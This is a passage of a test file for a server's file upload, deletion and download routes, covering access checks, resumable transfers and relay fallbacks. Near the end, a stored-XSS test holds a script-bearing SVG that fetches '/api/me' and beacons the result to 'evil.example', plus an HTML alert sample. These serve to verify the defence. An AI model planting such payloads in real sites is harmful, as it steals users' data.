      body: JSON.stringify({ path: '/tmp/private-value.txt' }),
    });
    expect(res.status).toBe(status);
    const response = await res.json();
    expect(response).toEqual({ error });
    expect(JSON.stringify(response)).not.toContain('private-value');
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('rejects unknown explicit-path request fields without echoing them', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const res = await makeApp().request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: '/tmp/private-value.txt', recursive: true }),
    });
    expect(res.status).toBe(400);
    expect(await res.json()).toEqual({ error: 'invalid_request' });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('rejects an oversized explicit-path request before daemon dispatch', async () => {
    queryOneMock.mockResolvedValue({ user_id: 'user-1', node_role: 'controlled', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    const privateValue = `private-${'x'.repeat(FILE_TRANSFER_PATH_MAX_BYTES + 1024)}`;
    const res = await makeApp().request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1', 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: privateValue }),
    });
    expect(res.status).toBe(413);
    const response = await res.json();
    expect(response).toEqual({ error: 'request_too_large' });
    expect(JSON.stringify(response)).not.toContain(privateValue);
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('rejects share-only uploads with the direct-surface reason before daemon relay', async () => {
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({
      ok: false,
      reason: 'share-direct-surface-denied',
    });
    const form = new FormData();
    form.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));

    const res = await makeApp().request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: form,
    });

    expect(res.status).toBe(403);
    await expect(res.json()).resolves.toEqual({ error: 'forbidden', reason: 'share-direct-surface-denied' });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('lets a shared participant upload within the covered session while a viewer remains read-only', async () => {
    mockSharedFileAccess('viewer');
    const viewerForm = new FormData();
    viewerForm.append('file', new File(['viewer'], 'viewer.txt', { type: 'text/plain' }));
    const viewer = await makeApp().request('/api/server/srv-1/upload?sessionName=deck_project_brain', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: viewerForm,
    });
    expect(viewer.status).toBe(403);
    await expect(viewer.json()).resolves.toEqual({ error: 'forbidden', reason: 'share-role-denied' });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();

    mockSharedFileAccess('participant');
    const participantForm = new FormData();
    participantForm.append('file', new File(['participant'], 'participant.txt', { type: 'text/plain' }));
    const participant = await makeApp().request('/api/server/srv-1/upload?sessionName=deck_project_brain', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: participantForm,
    });
    expect(participant.status).toBe(200);
    expect(mockResolveHttpShareAccessForCoveredSession).toHaveBeenCalledWith(expect.anything(), expect.objectContaining({
      serverId: 'srv-1',
      userId: 'user-1',
      target: { kind: 'main', serverId: 'srv-1', sessionName: 'deck_project_brain' },
    }));
    expect(sendFileTransferRequestMock).toHaveBeenCalled();
  });

  it('rejects oversized legacy uploads from content-length before daemon relay', async () => {
    const res = await makeApp().request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: {
        Authorization: 'Bearer test',
        'Content-Type': 'multipart/form-data; boundary=x',
        'Content-Length': String(FILE_TRANSFER_LIMITS.MAX_FILE_SIZE + 1024 * 1024 + 1),
      },
      body: '--x\r\n',
    });

    expect(res.status).toBe(413);
    await expect(res.json()).resolves.toEqual({
      error: 'file_too_large',
      maxBytes: FILE_TRANSFER_LIMITS.MAX_FILE_SIZE,
    });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('stages an upload for daemon HTTP fetch without relaying file bytes over WS', async () => {
    const app = makeApp();
    sendFileTransferRequestMock.mockImplementationOnce(async (_requestId, message) => {
      const uploadMessage = message as { downloadUrl: string };
      const fetchUrl = new URL(uploadMessage.downloadUrl);

      const first = await app.request(`${fetchUrl.pathname}${fetchUrl.search}`);
      await expect(first.text()).resolves.toBe('hello');
      const retry = await app.request(`${fetchUrl.pathname}${fetchUrl.search}`, {
        headers: { Range: 'bytes=2-' },
      });
      expect(retry.status).toBe(206);
      expect(retry.headers.get('content-range')).toBe('bytes 2-4/5');
      await expect(retry.text()).resolves.toBe('llo');

      return {
        type: 'file.upload_done',
        attachment: {
          id: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt',
          source: 'upload',
          daemonPath: '/tmp/upload.txt',
          downloadable: true,
        },
      };
    });

    const form = new FormData();
    form.append('file', new File(['hello'], 'a<b>:c?.txt', { type: 'text/plain' }));
    form.append('clientUploadId', 'client_upload_1234');

    const res = await app.request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: form,
    });

    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toMatchObject({
      ok: true,
      attachment: {
        serverId: 'srv-1',
        daemonPath: '/tmp/upload.txt',
      },
    });
    expect(sendFileTransferRequestMock.mock.calls[0]?.[0]).toEqual(expect.any(String));
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toEqual(expect.objectContaining({
      type: 'file.upload_fetch',
      filename: expect.stringMatching(/^[a-f0-9]{32}\.txt$/),
      originalName: 'a<b>:c?.txt',
      sanitizedName: 'a_b_c_.txt',
      mime: 'text/plain',
      size: 5,
      downloadUrl: expect.stringContaining('/api/server/srv-1/upload-staged/'),
      clientUploadId: 'client_upload_1234',
    }));
    expect(sendFileTransferRequestMock.mock.calls[0]?.[2]).toBe(FILE_TRANSFER_LIMITS.UPLOAD_TIMEOUT_MS);
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(FILE_TRANSFER_UPLOAD_FETCH_CAPABILITY);
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).not.toHaveProperty('content');
  });

  it('keeps a legacy extension in the request consumed by old daemons', async () => {
    const app = makeApp();
    const form = new FormData();
    form.append('file', new File([Buffer.from([0x89, 0x50, 0x4e, 0x47])], '截图 2026.png', { type: 'image/png' }));

    const response = await app.request('/api/server/srv-1/upload', {
      method: 'POST', headers: { Authorization: 'Bearer test' }, body: form,
    });
    expect(response.status).toBe(200);

    const message = sendFileTransferRequestMock.mock.calls[0]?.[1] as {
      filename: string;
      originalName?: string;
      sanitizedName?: string;
    };
    // 4931/4861 read only filename when choosing their flat path.
    const oldDaemonPath = `/home/test/.imcodes/uploads/${message.filename}`;
    expect(oldDaemonPath).toMatch(/[a-f0-9]{32}\.png$/);
    expect(message.originalName).toBe('截图 2026.png');
    expect(message.sanitizedName).toBe('截图 2026.png');
  });

  it('accepts resumable browser chunks idempotently and dispatches only the assembled file', async () => {
    const app = makeApp();
    sendFileTransferRequestMock.mockImplementationOnce(async (_requestId, message) => {
      const uploadUrl = new URL((message as { downloadUrl: string }).downloadUrl);
      const staged = await app.request(`${uploadUrl.pathname}${uploadUrl.search}`);
      await expect(staged.text()).resolves.toBe('hello');
      return {
        type: 'file.upload_done',
        attachment: {
          id: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.txt',
          source: 'upload',
          daemonPath: '/tmp/resume.txt',
          downloadable: true,
        },
      };
    });
    const fields = {
      clientUploadId: `resumable_${crypto.randomUUID().replaceAll('-', '')}`,
      uploadTotalSize: '5',
      uploadOriginalName: 'hello.txt',
      uploadLastModified: '1234',
    };
    const request = (body: string, offset: number) => {
      const form = new FormData();
      form.append('file', new File([body], 'hello.txt', { type: 'text/plain' }));
      form.append('clientUploadId', fields.clientUploadId);
      form.append('uploadOffset', String(offset));
      form.append('uploadTotalSize', fields.uploadTotalSize);
      form.append('uploadOriginalName', fields.uploadOriginalName);
      form.append('uploadLastModified', fields.uploadLastModified);
      return app.request('/api/server/srv-1/upload', {
        method: 'POST', headers: { Authorization: 'Bearer test' }, body: form,
      });
    };

    const first = await request('hel', 0);
    expect(first.status).toBe(200);
    await expect(first.json()).resolves.toEqual({ ok: true, complete: false, committedBytes: 3 });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();

    // Lost-response replay: the exact chunk is accepted without appending it.
    const duplicate = await request('hel', 0);
    await expect(duplicate.json()).resolves.toEqual({ ok: true, complete: false, committedBytes: 3 });
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();

    const changed = await request('HEX', 0);
    expect(changed.status).toBe(400);
    await expect(changed.json()).resolves.toMatchObject({ error: 'upload_content_mismatch' });

    const finished = await request('lo', 3);
    expect(finished.status).toBe(200);
    await expect(finished.json()).resolves.toMatchObject({ ok: true, attachment: { daemonPath: '/tmp/resume.txt' } });
    expect(sendFileTransferRequestMock).toHaveBeenCalledOnce();
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toEqual(expect.objectContaining({
      type: 'file.upload_fetch',
      clientUploadId: fields.clientUploadId,
      originalName: fields.uploadOriginalName,
      size: 5,
    }));
  });

  it('omits clientUploadId when relaying to an older daemon without direct-transfer capability', async () => {
    hasDaemonCapabilityMock.mockImplementation((capability: string) => (
      capability === FILE_TRANSFER_UPLOAD_FETCH_CAPABILITY
    ));

    const form = new FormData();
    form.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));
    form.append('clientUploadId', 'client_upload_1234');

    const res = await makeApp().request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: form,
    });

    expect(res.status).toBe(200);
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(DIRECT_FILE_TRANSFER_UPLOAD_RECOVERY_CAPABILITY);
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toEqual(expect.objectContaining({
      type: FILE_TRANSFER_MSG.UPLOAD_FETCH,
    }));
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).not.toHaveProperty('clientUploadId');
  });

  it('cleans relay-staged uploads after a successful daemon fetch grace window', async () => {
    vi.useFakeTimers();
    try {
      const app = makeApp();
      sendFileTransferRequestMock.mockImplementationOnce(async (_requestId, message) => {
        const uploadMessage = message as { downloadUrl: string };
        const fetchUrl = new URL(uploadMessage.downloadUrl);
        const stagedPath = `${fetchUrl.pathname}${fetchUrl.search}`;

        const first = await app.request(stagedPath);
        expect(first.status).toBe(200);
        await expect(first.text()).resolves.toBe('hello');

        await vi.advanceTimersByTimeAsync(30_001);
        const expired = await app.request(stagedPath);
        expect(expired.status).toBe(404);

        return {
          type: 'file.upload_done',
          attachment: {
            id: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt',
            source: 'upload',
            daemonPath: '/tmp/upload.txt',
            downloadable: true,
          },
        };
      });

      const form = new FormData();
      form.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));

      const res = await app.request('/api/server/srv-1/upload', {
        method: 'POST',
        headers: { Authorization: 'Bearer test' },
        body: form,
      });

      expect(res.status).toBe(200);
    } finally {
      vi.useRealTimers();
    }
  });

  it('rechecks controlled access before a daemon redeems a staged upload', async () => {
    const app = makeApp();
    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'participant', access_source: 'share', exec_granted: true,
    });
    let stagedStatus: number | undefined;
    sendFileTransferRequestMock.mockImplementationOnce(async (_requestId, message) => {
      const uploadUrl = new URL((message as { downloadUrl: string }).downloadUrl);
      queryOneMock.mockResolvedValue({
        user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
        revoked_at: null, access_role: 'viewer', access_source: 'share', exec_granted: false,
      });
      const staged = await app.request(`${uploadUrl.pathname}${uploadUrl.search}`);
      stagedStatus = staged.status;
      return { type: 'file.upload_error', message: 'forbidden' };
    });

    const form = new FormData();
    form.append('file', new File(['secret'], 'secret.txt', { type: 'text/plain' }));
    const response = await app.request('/api/server/controlled-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1' },
      body: form,
    });

    expect(response.status).toBe(403);
    expect(stagedStatus).toBe(403);
  });

  it('falls back to legacy base64 upload when daemon has no relay fetch capability', async () => {
    hasDaemonCapabilityMock.mockReturnValue(false);

    const form = new FormData();
    form.append('file', new File(['hello'], 'hello.txt', { type: 'text/plain' }));

    const res = await makeApp().request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: { Authorization: 'Bearer test' },
      body: form,
    });

    expect(res.status).toBe(200);
    await expect(res.json()).resolves.toMatchObject({
      ok: true,
      attachment: {
        serverId: 'srv-1',
        daemonPath: '/tmp/upload.txt',
      },
    });
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).toEqual(expect.objectContaining({
      type: 'file.upload',
      originalName: 'hello.txt',
      mime: 'text/plain',
      size: 5,
      content: Buffer.from('hello').toString('base64'),
    }));
    expect(sendFileTransferRequestMock.mock.calls[0]?.[1]).not.toHaveProperty('downloadUrl');
  });

  it('streams daemon fetch progress for browsers that opt in', async () => {
    sendFileTransferRequestMock.mockImplementationOnce(async (_requestId, _message, _timeoutMs, onProgress) => {
      onProgress?.({
        type: 'file.upload_progress',
        uploadId: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
        loaded: 3,
        total: 6,
      });
      return {
        type: 'file.upload_done',
        attachment: {
          id: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.txt',
          source: 'upload',
          daemonPath: '/tmp/upload.txt',
          downloadable: true,
        },
      };
    });

    const form = new FormData();
    form.append('file', new File(['hello!'], 'hello.txt', { type: 'text/plain' }));

    const res = await makeApp().request('/api/server/srv-1/upload', {
      method: 'POST',
      headers: {
        Authorization: 'Bearer test',
        Accept: 'application/x-ndjson',
      },
      body: form,
    });

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('application/x-ndjson');
    const lines = (await res.text()).trim().split('\n').map((line) => JSON.parse(line));
    expect(lines).toEqual([
      expect.objectContaining({ type: 'file.upload_progress', loaded: 0, total: 6 }),
      expect.objectContaining({ type: 'file.upload_progress', loaded: 3, total: 6 }),
      expect.objectContaining({
        type: 'file.upload_done',
        ok: true,
        attachment: expect.objectContaining({
          serverId: 'srv-1',
          daemonPath: '/tmp/upload.txt',
        }),
      }),
    ]);
  });
});

describe('file-transfer attachment deletion route', () => {
  beforeEach(() => {
    sendFileTransferRequestMock.mockReset();
    isDaemonConnectedMock.mockReset().mockReturnValue(true);
    hasDaemonCapabilityMock.mockReset().mockReturnValue(true);
    daemonConnectionGenerationMock.mockReset().mockReturnValue(1);
    mockResolveServerMemberAccessOrShareDeny.mockReset().mockResolvedValue({ ok: true, role: 'owner' });
    mockResolveHttpShareAccessForCoveredSession.mockReset();
    queryOneMock.mockReset().mockResolvedValue({ user_id: 'user-1', node_role: 'full', exec_enabled: true, revoked_at: null, access_role: 'owner', access_source: 'owner', exec_granted: false });
    sendFileTransferRequestMock.mockResolvedValue({ type: FILE_TRANSFER_MSG.DELETE_DONE, requestId: 'a'.repeat(32) });
  });

  it('authorizes the member and relays an exact attachment delete request', async () => {
    const response = await makeApp().request('/api/server/srv-1/uploads/abcdef1234.txt', {
      method: 'DELETE',
      headers: { Authorization: 'Bearer test' },
    });

    expect(response.status).toBe(200);
    await expect(response.json()).resolves.toEqual({ ok: true });
    expect(mockResolveServerMemberAccessOrShareDeny).toHaveBeenCalledWith(expect.anything(), {
      serverId: 'srv-1',
      userId: 'user-1',
    });
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      'a'.repeat(32),
      { type: FILE_TRANSFER_MSG.DELETE, requestId: 'a'.repeat(32), attachmentId: 'abcdef1234.txt' },
      30_000,
      undefined,
      undefined,
    );
  });

  it('rejects share-only attachment deletion before contacting the daemon', async () => {
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValueOnce({
      ok: false,
      reason: 'share-direct-surface-denied',
    });

    const response = await makeApp().request('/api/server/srv-1/uploads/abcdef1234.txt', {
      method: 'DELETE',
      headers: { Authorization: 'Bearer test' },
    });

    expect(response.status).toBe(403);
    await expect(response.json()).resolves.toEqual({
      error: 'forbidden',
      reason: 'share-direct-surface-denied',
    });
    expect(mockResolveServerMemberAccessOrShareDeny).toHaveBeenCalledOnce();
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });

  it('allows a shared participant to delete an uploaded attachment in the covered session', async () => {
    mockSharedFileAccess('participant');
    const response = await makeApp().request(
      '/api/server/srv-1/uploads/abcdef1234.txt?sessionName=deck_project_brain',
      { method: 'DELETE', headers: { Authorization: 'Bearer test' } },
    );

    expect(response.status).toBe(200);
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      'a'.repeat(32),
      expect.objectContaining({ type: FILE_TRANSFER_MSG.DELETE, attachmentId: 'abcdef1234.txt' }),
      30_000,
      undefined,
      undefined,
    );
  });

  it('rejects malformed attachment ids before contacting the daemon', async () => {
    const response = await makeApp().request('/api/server/srv-1/uploads/not.valid.ext.more', {
      method: 'DELETE',
      headers: { Authorization: 'Bearer test' },
    });
    expect(response.status).toBe(400);
    expect(sendFileTransferRequestMock).not.toHaveBeenCalled();
  });
});

describe('file-transfer download route', () => {
  beforeEach(() => {
    sendFileTransferRequestMock.mockReset();
    isDaemonConnectedMock.mockReset();
    hasDaemonCapabilityMock.mockReset();
    daemonConnectionGenerationMock.mockReset().mockReturnValue(1);
    isDaemonConnectedMock.mockReturnValue(true);
    hasDaemonCapabilityMock.mockReturnValue(true);
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({ ok: true, role: 'owner' });
    mockResolveHttpShareAccessForCoveredSession.mockReset();
    queryOneMock.mockReset().mockResolvedValue({
      user_id: 'user-1', node_role: 'full', exec_enabled: true,
      revoked_at: null, access_role: 'owner',
    });
  });

  it('allows a shared viewer to download and preview a covered-session attachment', async () => {
    mockSharedFileAccess('viewer');
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: FILE_TRANSFER_MSG.DOWNLOAD_DONE,
      content: Buffer.from('shared image bytes').toString('base64'),
      mime: 'image/png',
      filename: 'shared.png',
    });

    const response = await makeApp().request(
      '/api/server/srv-1/uploads/abc123/download?sessionName=deck_project_brain',
      { headers: { Authorization: 'Bearer test' } },
    );

    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toContain('image/png');
    expect(response.headers.get('content-disposition')).toContain('inline');
    await expect(response.text()).resolves.toBe('shared image bytes');
    expect(mockResolveHttpShareAccessForCoveredSession).toHaveBeenCalledWith(expect.anything(), expect.objectContaining({
      target: { kind: 'main', serverId: 'srv-1', sessionName: 'deck_project_brain' },
    }));
  });

  it('uses canonical SERVER_URL for the controlled-node staged upload callback', async () => {
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: 'file.download_done',
      content: Buffer.from('hello').toString('base64'),
      mime: 'text/plain',
      filename: 'hello.txt',
    });

    const response = await makeApp('https://im.codes').request(
      'http://internal-pod:3000/api/server/srv-1/uploads/abc123/download',
      { headers: { Authorization: 'Bearer test' } },
    );

    expect(response.status).toBe(200);
    const message = sendFileTransferRequestMock.mock.calls[0]?.[1] as { uploadUrl: string };
    expect(new URL(message.uploadUrl).origin).toBe('https://im.codes');
  });

  it('starts the browser download when the daemon PUT starts even if bridge ready never resolves', async () => {
    const app = makeApp();
    let stagedPut: Promise<Response> | undefined;

    sendFileTransferRequestMock.mockImplementationOnce((_requestId, message) => {
      const downloadMessage = message as { type: string; uploadUrl: string };
      expect(downloadMessage.type).toBe(FILE_TRANSFER_MSG.DOWNLOAD_STREAM);
      const uploadUrl = new URL(downloadMessage.uploadUrl);
      stagedPut = app.request(`${uploadUrl.pathname}${uploadUrl.search}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'text/plain',
          'Content-Length': '5',
          'x-imcodes-filename': encodeURIComponent('hello.txt'),
        },
        body: 'hello',
      });
      return new Promise(() => {});
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test' },
    });

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/plain');
    expect(res.headers.get('content-length')).toBe('5');
    expect(res.headers.get('content-disposition')).toContain('hello.txt');
    await expect(res.text()).resolves.toBe('hello');
    await expect(stagedPut).resolves.toMatchObject({ status: 200 });
    expect(sendFileTransferRequestMock).toHaveBeenCalledWith(
      expect.any(String),
      expect.objectContaining({
        type: FILE_TRANSFER_MSG.DOWNLOAD_STREAM,
        attachmentId: 'abc123',
        uploadUrl: expect.stringContaining('/api/server/srv-1/download-staged/'),
      }),
      FILE_TRANSFER_LIMITS.DOWNLOAD_TIMEOUT_MS,
    );
    expect(hasDaemonCapabilityMock).toHaveBeenCalledWith(FILE_TRANSFER_DOWNLOAD_STREAM_CAPABILITY);
  });

  it('resumes an interrupted download from the byte the browser asks for', async () => {
    const app = makeApp();
    let stagedPut: Promise<Response> | undefined;
    sendFileTransferRequestMock.mockImplementationOnce((_requestId, message) => {
      const downloadMessage = message as { type: string; uploadUrl: string; offset?: number };
      expect(downloadMessage).toMatchObject({ type: FILE_TRANSFER_MSG.DOWNLOAD_STREAM, offset: 2 });
      const uploadUrl = new URL(downloadMessage.uploadUrl);
      // The node streams only the missing tail and says where it starts.
      stagedPut = app.request(`${uploadUrl.pathname}${uploadUrl.search}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'text/plain',
          'Content-Length': '3',
          [FILE_TRANSFER_RELAY_HEADER.FILENAME]: encodeURIComponent('hello.txt'),
          [FILE_TRANSFER_RELAY_HEADER.OFFSET]: '2',
        },
        body: 'llo',
      });
      return new Promise(() => {});
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test', Range: formatFileTransferRangeRequest(2) },
    });

    expect(res.status).toBe(206);
    expect(res.headers.get('content-range')).toBe('bytes 2-4/5');
    expect(res.headers.get('content-length')).toBe('3');
    expect(res.headers.get('accept-ranges')).toBe('bytes');
    await expect(res.text()).resolves.toBe('llo');
    await expect(stagedPut).resolves.toMatchObject({ status: 200 });
  });

  it('serves the missing tail of a small inline download, and 416 past its end', async () => {
    sendFileTransferRequestMock.mockResolvedValue({
      type: 'file.download_done',
      content: Buffer.from('hello').toString('base64'),
      mime: 'text/plain',
      filename: 'hello.txt',
    });
    const app = makeApp();
    const tail = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test', Range: formatFileTransferRangeRequest(3) },
    });
    expect(tail.status).toBe(206);
    expect(tail.headers.get('content-range')).toBe('bytes 3-4/5');
    await expect(tail.text()).resolves.toBe('lo');

    const past = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test', Range: formatFileTransferRangeRequest(5) },
    });
    expect(past.status).toBe(416);
    expect(past.headers.get('content-range')).toBe('bytes */5');
  });

  it('rejects a staged download sink when controlled access was revoked after minting', async () => {
    const app = makeApp();
    queryOneMock.mockResolvedValue({
      user_id: 'machine-owner', node_role: 'controlled', exec_enabled: true,
      revoked_at: null, access_role: 'participant', access_source: 'share', exec_granted: true,
    });
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: FILE_TRANSFER_MSG.PATH_HANDLE_DONE,
      attachment: { id: 'abc123', source: 'local', downloadable: true },
      sourceIdentity: { size: 6, mtimeMs: 1, device: 2, inode: 3 },
    });
    expect((await app.request('/api/server/controlled-1/machine-file-handle', {
      method: 'POST', headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1' },
      body: JSON.stringify({ path: '/scoped/secret.txt' }),
    })).status).toBe(200);
    const stagedStatuses: number[] = [];
    sendFileTransferRequestMock.mockImplementation(async (_requestId, message) => {
      if ((message as { type?: string }).type !== FILE_TRANSFER_MSG.DOWNLOAD_STREAM) {
        return { type: 'file.download_error', message: 'not_found' };
      }
      const uploadUrl = new URL((message as { uploadUrl: string }).uploadUrl);
      queryOneMock.mockResolvedValue(null);
      const staged = await app.request(`${uploadUrl.pathname}${uploadUrl.search}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'text/plain', 'Content-Length': '6' },
        body: 'secret',
      });
      stagedStatuses.push(staged.status);
      return { type: 'file.download_error', message: 'not_found' };
    });

    const response = await app.request('/api/server/controlled-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer source', 'X-Server-Id': 'full-1' },
    });

    expect(response.status).toBe(403);
    expect(stagedStatuses.length).toBeGreaterThan(0);
    expect(stagedStatuses.every((status) => status === 403)).toBe(true);
  });

  it('falls back to the base64 download when the streamed relay fails to deliver bytes', async () => {
    const app = makeApp();
    // Every relay attempt rejects (relay wedged / never delivers); the base64
    // file.download fallback then succeeds.
    sendFileTransferRequestMock.mockImplementation((_requestId: string, message: unknown) => {
      const type = (message as { type: string }).type;
      if (type === FILE_TRANSFER_MSG.DOWNLOAD_STREAM) return Promise.reject(new Error('relay_upload_502'));
      expect(type).toBe('file.download');
      return Promise.resolve({
        content: Buffer.from('hello world').toString('base64'),
        mime: 'text/plain',
        filename: 'hello.txt',
      });
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test' },
    });

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/plain');
    expect(res.headers.get('content-disposition')).toContain('hello.txt');
    await expect(res.text()).resolves.toBe('hello world');
    // All relay retries + the base64 fallback were issued.
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(FILE_TRANSFER_LIMITS.DOWNLOAD_STREAM_MAX_ATTEMPTS + 1);
  });

  it('surfaces a genuine not_found from the relay without a pointless base64 retry', async () => {
    const app = makeApp();
    sendFileTransferRequestMock.mockImplementationOnce((_requestId: string, message: unknown) => {
      expect((message as { type: string }).type).toBe(FILE_TRANSFER_MSG.DOWNLOAD_STREAM);
      return Promise.resolve({ type: 'file.download_error', message: 'not_found' });
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test' },
    });

    expect(res.status).toBe(404);
    // A genuine missing-handle error must NOT trigger a base64 fallback.
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(1);
  });

  it('falls back to base64 when the relay reports a transport error (not a missing handle)', async () => {
    const app = makeApp();
    // Every relay attempt returns a transport error (NOT not_found); the base64
    // file.download fallback then succeeds.
    sendFileTransferRequestMock.mockImplementation((_requestId: string, message: unknown) => {
      const type = (message as { type: string }).type;
      if (type === FILE_TRANSFER_MSG.DOWNLOAD_STREAM) return Promise.resolve({ type: 'file.download_error', message: 'relay_upload_502' });
      expect(type).toBe('file.download');
      return Promise.resolve({
        content: Buffer.from('recovered').toString('base64'),
        mime: 'text/plain',
        filename: 'r.txt',
      });
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test' },
    });

    expect(res.status).toBe(200);
    await expect(res.text()).resolves.toBe('recovered');
    // Relay errors → retries → base64 fallback, instead of a hard failure.
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(FILE_TRANSFER_LIMITS.DOWNLOAD_STREAM_MAX_ATTEMPTS + 1);
  });

  it('returns a small file INLINE (file.download_done over WS) in one round-trip — no relay PUT, no fallback', async () => {
    const app = makeApp();
    // The daemon returns small files inline over the WS RPC instead of streaming
    // through the relay. The server must return those bytes directly — the fast
    // path that makes tiny files instant instead of waiting on the relay.
    sendFileTransferRequestMock.mockImplementationOnce((_requestId: string, message: unknown) => {
      expect((message as { type: string }).type).toBe(FILE_TRANSFER_MSG.DOWNLOAD_STREAM);
      return Promise.resolve({
        type: 'file.download_done',
        content: Buffer.from('hi there').toString('base64'),
        mime: 'text/plain',
        filename: 'note.txt',
      });
    });

    const res = await app.request('/api/server/srv-1/uploads/abc123/download', {
      headers: { Authorization: 'Bearer test' },
    });

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toContain('text/plain');
    expect(res.headers.get('content-disposition')).toContain('note.txt');
    await expect(res.text()).resolves.toBe('hi there');
    // Exactly one WS call: no relay PUT and no base64 fallback round-trip.
    expect(sendFileTransferRequestMock).toHaveBeenCalledTimes(1);
  });
});

/**
 * Owner decision (audit tsk_854675e1e2, Q5iii): the download routes answer on the app origin, so a script-bearing SVG / HTML file
 * served inline would run there (stored XSS against whoever opens the link). Only raster images are inline; every response carries
 * nosniff and a sandboxing CSP. Both serving paths (inline base64 and the streaming relay) are exercised with the real route.
 */
describe('file-transfer download route: nothing renders as a document on the app origin', () => {
  const SCRIPT_SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/api/me").then(r=>r.text()).then(t=>navigator.sendBeacon("https://evil.example/",t))</script><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>';
  const SCRIPT_HTML = '<!doctype html><script>alert(document.domain)</script>';

  beforeEach(() => {
    sendFileTransferRequestMock.mockReset();
    isDaemonConnectedMock.mockReset().mockReturnValue(true);
    hasDaemonCapabilityMock.mockReset().mockReturnValue(true);
    daemonConnectionGenerationMock.mockReset().mockReturnValue(1);
    mockResolveServerMemberAccessOrShareDeny.mockResolvedValue({ ok: true, role: 'owner' });
    queryOneMock.mockReset().mockResolvedValue({ user_id: 'user-1', node_role: 'full', exec_enabled: true, revoked_at: null, access_role: 'owner' });
  });

  async function downloadInline(mime: string | undefined, filename: string, body: string) {
    sendFileTransferRequestMock.mockResolvedValueOnce({
      type: FILE_TRANSFER_MSG.DOWNLOAD_DONE, content: Buffer.from(body).toString('base64'), ...(mime === undefined ? {} : { mime }), filename,
    });
